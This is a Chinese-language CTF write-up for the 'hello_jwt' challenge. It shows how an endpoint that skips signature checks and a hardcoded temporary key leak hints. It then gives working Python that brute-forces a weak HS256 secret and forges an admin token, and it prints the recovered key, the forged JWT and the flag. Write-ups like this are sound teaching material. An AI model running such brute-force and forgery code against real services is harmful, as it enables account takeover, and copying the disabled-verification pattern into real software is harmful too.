# hello_jwt

## 题目简述

题目使用 HS256 JWT 保存登录身份。普通注册用户的 `role` 固定为 `guest`，而 `/flag` 只允许签名有效且 `role` 为 `admin` 的 token。两个提示接口分别泄露了密钥长度和字符集，最终可以离线爆破 HS256 密钥并伪造管理员 token。

JWT 的紧凑格式由 `header.payload.signature` 三段组成。前两段只是 Base64URL 编码，可以直接读取和修改；HS256 签名则是以共享密钥计算的 HMAC-SHA256：

$$
\operatorname{HMAC\text{-}SHA256}(KEY,\ header.payload)
$$

题目通过 Cookie 传递 JWT，但 JWT 本身并不是 Cookie 格式。

## 解题过程

### 1. 获取正常的 guest token

注册并登录任意账号后，服务端生成如下载荷：

```json
{
  "username": "1",
  "role": "guest"
}
```

以下是该账号对应的一枚有效 token，后续爆破必须使用服务端真正签发、签名未被修改的 token：

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.pOnpW6lL3rbPptxveroBZMGOWLRTGjcnmNycBLPA4kc
```

### 2. 读取两个提示

`/hint1` 的验证代码关闭了签名检查：

```python
jwt.decode(
    token,
    KEY,
    algorithms=["HS256"],
    options={"verify_signature": False},
)
```

因此只需把 payload 中的 `role` 改为：

```text
Please, give me the hint
```

签名段可以沿用旧值。访问 `/hint1` 后得到第一条信息：`KEY` 长度不大。

`/hint2` 会正常验签，但签名密钥直接硬编码在公开源码中：

```text
Very very long and include many !@#$)*$&@) so you can't crack's secret key
```

使用该临时密钥给 `role` 为 `But, I can see the temporary key` 的载荷签名，访问 `/hint2`，得到第二条信息：`KEY` 只包含小写字母。

下面的函数可以在本地生成两种提示 token，也可在得到真实密钥后生成管理员 token：

```python
import base64
import hashlib
import hmac
import json

def b64url(data: bytes) -> bytes:
    return base64.urlsafe_b64encode(data).rstrip(b"=")

def make_token(payload: dict, key: str) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    header_part = b64url(json.dumps(header, separators=(",", ":")).encode())
    payload_part = b64url(json.dumps(payload, separators=(",", ":")).encode())
    message = header_part + b"." + payload_part
    signature = b64url(hmac.new(key.encode(), message, hashlib.sha256).digest())
    return (message + b"." + signature).decode()

tmp_key = "Very very long and include many !@#$)*$&@) so you can't crack's secret key"
print(make_token(
    {"username": "1", "role": "But, I can see the temporary key"},
    tmp_key,
))
```

### 3. 离线爆破 HS256 密钥

HS256 使用对称密钥。已知一枚合法 token 后，可以枚举候选密钥，重新计算签名并与原签名比较。根据两条提示，只枚举长度不超过 5 的小写字母串即可找到本题密钥：

```python
import base64
import hashlib
import hmac
import itertools
import string

token = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
    "eyJ1c2VybmFtZSI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ."
    "pOnpW6lL3rbPptxveroBZMGOWLRTGjcnmNycBLPA4kc"
)

header, payload, signature = token.split(".")
message = f"{header}.{payload}".encode()
expected = base64.urlsafe_b64decode(signature + "=" * (-len(signature) % 4))

for length in range(1, 6):
    for chars in itertools.product(string.ascii_lowercase, repeat=length):
        candidate = "".join(chars)
        actual = hmac.new(candidate.encode(), message, hashlib.sha256).digest()
        if hmac.compare_digest(actual, expected):
            print(candidate)
            raise SystemExit
```

输出为：

```text
zrajz
```

### 4. 伪造管理员 token

把真实密钥代入前面的 `make_token`，将角色改为 `admin`：

```python
print(make_token({"username": "1", "role": "admin"}, "zrajz"))
```

得到：

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEiLCJyb2xlIjoiYWRtaW4ifQ.yh2o6zctKZ5TNuZTB4w6IpENo5aX2Vs72hXes8CmTo4
```

将其写入 `token` Cookie 后访问 `/flag`：

```text
0xgame{883fa114-ebf3-4ea9-b8cd-366f3ba846e7}
```

## 方法总结

本题没有使用 `alg=none` 等算法混淆，而是通过两个提示逐步缩小 HS256 共享密钥的搜索空间。关闭签名验证只影响 `/hint1`，不能直接访问 `/flag`；真正的通关步骤仍是用服务端签发的 guest token 离线验证候选密钥，再以恢复出的 `zrajz` 重新签名管理员载荷。
